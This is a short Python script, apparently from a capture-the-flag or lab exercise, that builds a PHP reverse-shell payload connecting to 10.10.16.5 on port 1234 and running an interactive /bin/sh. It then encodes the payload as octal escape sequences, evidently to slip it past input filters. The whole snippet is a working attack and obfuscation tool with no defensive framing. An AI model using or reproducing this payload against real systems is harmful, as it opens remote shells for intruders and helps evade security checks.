payload = '$sock=fsockopen("10.10.16.5",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

encoded_payload = ''
for char in payload:
    encoded_payload += "\\" + oct(ord(char))[2:].zfill(3)  # Convert to octal and add to encoded payload

print(encoded_payload)
